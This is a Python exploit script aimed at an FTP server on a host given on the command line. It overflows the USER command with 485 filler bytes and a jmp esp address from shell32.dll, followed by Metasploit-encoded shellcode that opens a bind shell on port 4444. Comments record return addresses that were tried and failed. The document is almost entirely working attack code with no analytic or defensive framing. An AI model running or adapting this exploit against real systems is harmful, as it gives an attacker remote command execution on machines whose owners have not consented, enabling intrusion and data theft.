#!/usr/bin/python

import sys
import socket
hostname = sys.argv[1]

#msfpayload windows/shell_bind_tcp LPORT = 4444 R | msfencode -b '\x00\x0a\x0d\x40' -e x86/shikata_ga_nai -s 597
#[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)

payload = (
"\xb8\x10\xad\x1e\x46\xd9\xcf\xd9\x74\x24\xf4\x5f\x33\xc9" 
"\xb1\x6a\x31\x47\x14\x83\xc7\x04\x03\x47\x10\xf2\x58\xa4" 
"\x35\xfa\xde\x6f\x63\x38\xc7\xe4\xb0\x48\xa0\x2f\x70\x01" 
"\x32\xb3\x6a\x9d\x84\xe3\x7b\x5e\xb7\x12\x9e\xe6\x82\xfb" 
"\xed\x56\x1a\xd0\x6e\x0f\x60\x18\x06\x6e\x3a\x7e\xd7\x5c" 
"\x68\x31\xe8\x51\xd6\x61\xbf\xc2\xd8\xe8\xc2\x9f\x16\xc8" 
"\x7e\xb4\x37\x63\x24\xdd\x4d\xb4\x3e\x0b\xc9\x39\x7a\xe3" 
"\x92\x9f\x57\x6b\xed\xec\x81\xd8\x90\x20\x38\x59\x56\x45" 
"\xc9\x8f\x04\xfd\x63\x9c\xa5\x1e\xf8\xf4\xfe\x34\x22\xe7" 
"\xf2\xb2\x3f\x82\x07\xd3\x7b\x47\x79\x19\xec\xd1\x19\x36" 
"\x72\xbf\x79\x76\xc5\xce\xce\xab\x92\x8c\xa5\xf5\xd8\xa3" 
"\x65\x2e\x2a\x93\x2c\x46\x03\x50\xb4\x54\x69\x2e\xcc\xe0" 
"\xe4\x7d\xcc\x1c\x67\xb5\xac\x57\x6f\xe5\xe5\x44\x99\x2f" 
"\x44\x43\x66\x54\x9d\x01\x16\x85\x69\xd8\xc1\xad\xae\xb1" 
"\x87\x64\xfe\x81\x04\x62\x82\x31\xc7\x76\xe7\xe0\x2e\x11" 
"\x56\x3d\xad\x2d\x61\xbf\xb1\xe1\xd7\x14\x93\xa7\x60\x0b" 
"\x4d\x82\x91\x52\x60\xb8\x70\x1e\x09\xd3\xbc\x7e\xf6\xd2" 
"\xfd\xce\x6c\x5b\x8c\xfb\x17\x31\xa8\xb5\x5c\x4c\x84\x49" 
"\x70\x23\x4c\x94\x70\xed\xa5\x47\x33\x80\x23\x83\x64\x2d" 
"\x63\xf0\x82\xe0\x0f\xe7\x21\x41\x3d\x9e\x92\x74\x7f\xfe" 
"\x2a\x05\x34\xeb\xbf\x75\xf9\xf8\xbc\x69\x6d\x2d\xfc\x68" 
"\xad\xb1\x8c\xfc\x89\x51\x4f\xf6\x5e\x81\x3b\xc2\xd8\x70" 
"\x81\x05\xf3\x4a\x99\x6e\x93\xde\x65\x16\x6b\x34\x93\x23" 
"\xf0\x0c\x9b\x9a\x41\x90\x59\xce\x45\x7c\x29\x87\xfa\xab" 
"\xb3\x03\x57\x64\xad\x53\xa1\x2f\x5c\xc3\xca\x1a\x39\x38" 
"\xeb\x43\x68\x51\x68\x29\x3a\x87\x19\x72\x19\xc2\x68\x62" 
"\x96\x24\x55\x50\x9a\xa9\x55\x72\xac\x89\xd3\x2f\x3e\x41" 
"\x4c\x2d\x73\xc6\x71\x33\x92\xbf\x7b\xb6\xbb\x53\x47\x3a" 
"\xf1\x9d\xc8\x6f\x3d\x52\xc6\x12\x31\xdf\x25\x56\xf1\xa3" 
"\xf4\x69\x41\xe4\x0f\xd8\xce\xf7\xe1\x82\x1f\x0c\x59\xa3" 
"\x6c\x49\xe1\x14\x75\x05\xd5\x16\x63\xd2\x7e\x4d\x43\xd0" 
"\x7a\x66\x5f\xca\xc0\x31\x48\x76\xfe\x6e\x66\xb6\xd7\x5a" 
"\x76"
)
#ret = "\xd6\x13\xab\x71" #ws2_32 here is wrong, you can't success!
#ret = "\x6d\x15\x9c\x7c" #7C9c156d shell32 push esp, failed too!
#username = "A" * 485 + ret + "C" * 4 + "D"*597

jmpesp = "\xD7\x30\x9D\x7C" #jmp esp shell32.dll good, ok!
username = "A" * 485 + jmpesp + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + payload
passwd = "anything"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((hostname, 21))
except:
    print ("[-] Connection error!")
    sys.exit(1)
r = sock.recv(1024)
print "[+] " + r
sock.send("user %s\r\n" %username)
r = sock.recv(1024)
print "[+] " + r
sock.send("pass %s\r\n" %passwd)
r = sock.recv(1024)
print "[+] " + r
sock.close()
